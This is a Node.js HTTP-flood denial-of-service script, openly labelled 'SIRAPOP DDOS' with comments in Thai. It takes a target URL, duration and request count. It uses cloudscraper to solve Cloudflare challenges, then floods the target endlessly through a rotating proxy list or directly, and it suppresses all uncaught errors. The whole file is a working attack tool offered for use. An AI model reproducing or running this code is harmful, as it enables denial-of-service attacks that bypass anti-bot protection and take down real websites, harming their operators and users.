require('events').EventEmitter.defaultMaxListeners = 0;
const axios = require('axios')
const fs = require('fs'),
    CloudScraper = require('cloudscraper'),
    path = require('path');

//ถ้าไม่เข้าเงื่อนใขให้print วิธีทํางาน
if (process.argv.length !== 6) {
    console.log(`
╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔╦╗╔═╗╦═╗╔╦╗
╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗ ║ ╠═╣╠╦╝ ║ 
╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝ ╩ ╩ ╩╩╚═ ╩ 

    Made With <3 By WeAreRainBowHAT ><
        Usage: node ${path.basename(__filename)} <http://example.com> <60> <150> <proxy/raw>`);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4];


//functions ส่ง request
function send_req_proxy(proxy) {

    let getHeaders = new Promise(function(resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 10
        }, function(error, response) {
            if (error) {
                let obj_v = proxies.indexOf(proxy);
                proxies.splice(obj_v, 1);
                return;
            }
            resolve(response.request.headers);
        });
    });

    //ดึงheader หลังจากนั้นก็flood
    getHeaders.then(function(result) {
        Object.keys(result).forEach(function(i, e) {
            console.log(i + ': ' + result[i]);
        });
        for (let i = 0; i < req_per_ip; ++i) {
            CloudScraper({
                uri: target,
                headers: result,
                proxy: 'http://' + proxy,
                followAllRedirects: false
            }, function(error, response) {
                if (error) {
                    console.log(error.message);
                }
            });
        }
    });
}

function send_req_raw() {

    let getHeaders = new Promise(function(resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            challengesToSolve: 10
        }, function(error, response) {
            if (error) {
                let obj_v = proxies.indexOf(proxy);
                proxies.splice(obj_v, 1);
                return;
            }
            resolve(response.request.headers);
        });
    });

    //ดึงheader หลังจากนั้นก็flood
    getHeaders.then(function(result) {
        Object.keys(result).forEach(function(i, e) {
            console.log(i + ': ' + result[i]);
        });
        for (let i = 0; i < req_per_ip; ++i) {
            CloudScraper({
                uri: target,
                headers: result,
                followAllRedirects: false
            }, function(error, response) {
                if (error) {
                    console.log(error.message);
                }
            });
        }
    });
}

//loopให้functions send_req รันเรื่อยๆ
if (process.argv[5] == "raw") {
    console.log(`
    ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔╦╗╔═╗╦═╗╔╦╗╔═╗╔╦╗
    ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗ ║ ╠═╣╠╦╝ ║ ║╣  ║║
    ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝ ╩ ╩ ╩╩╚═ ╩ ╚═╝═╩╝
    SIRAPOP DDOS !<3!
    `)
    setInterval(() => {
        send_req_raw();
    });
} else {
    proxx();
}

function proxx() {
    let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
    console.log(`
    ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔╦╗╔═╗╦═╗╔╦╗╔═╗╔╦╗
    ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗ ║ ╠═╣╠╦╝ ║ ║╣  ║║
    ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝ ╩ ╩ ╩╩╚═ ╩ ╚═╝═╩╝
    SIRAPOP DDOS !<3!
    `)
    setInterval(() => {
        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
        send_req_proxy(proxy);
    });
}

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);

// to avoid errors
process.on('uncaughtException', function(err) {

});
process.on('unhandledRejection', function(err) {

});